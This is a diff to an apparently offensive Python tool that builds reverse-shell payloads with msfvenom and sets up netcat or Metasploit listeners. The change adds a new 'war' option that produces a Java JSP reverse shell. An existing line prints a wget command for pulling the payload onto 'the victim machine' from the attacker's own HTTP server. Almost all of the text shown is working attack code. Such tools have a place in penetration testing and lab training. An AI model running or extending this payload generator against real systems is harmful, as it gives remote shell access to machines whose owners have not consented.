@@ -9,7 +9,7 @@ ap.add_argument('-I', '--interface', required=True, type=str, help='Select the n
 
 ap.add_argument('-P', '--port', required=True, type=str, help='Select the port you want to use.')
 
-ap.add_argument('-p', '--payload', required=True, type=str, help='Select the payload (php, bash, nc, oldnc, exe, dll, ps1, elf or python).')
+ap.add_argument('-p', '--payload', required=True, type=str, help='Select the payload (php, bash, nc, oldnc, exe, dll, ps1, elf, war or python).')
 
 ap.add_argument('-l', '--listener', required=False, type=str, help='Create a listener with netcat or metasploit (meterpreter): nc or msf (msf only works with .exe, .dll and .elf payloads).')
 
@@ -129,6 +129,12 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
         os.system(msfvenom)
         if args.httpserver != None:
             print(blue('\nDownload your payload on the victim machine with: ') + red("\nwget http://" + IP + ":" + args.httpserver + "/" + file))
+        message(file)
+    elif payload == 'war' or payload == '.war':
+        file = 'autoreverse.war'
+        print(blue('\nCreating the payload, please wait.'))
+        msfvenom = msfvenom.replace('windows/x64/','java/jsp_').replace('exe','war')
+        os.system(msfvenom)
         message(file)
     elif payload == 'powershell' or payload == 'ps1' or payload == '.ps1':
         file = 'autoreverse.ps1'
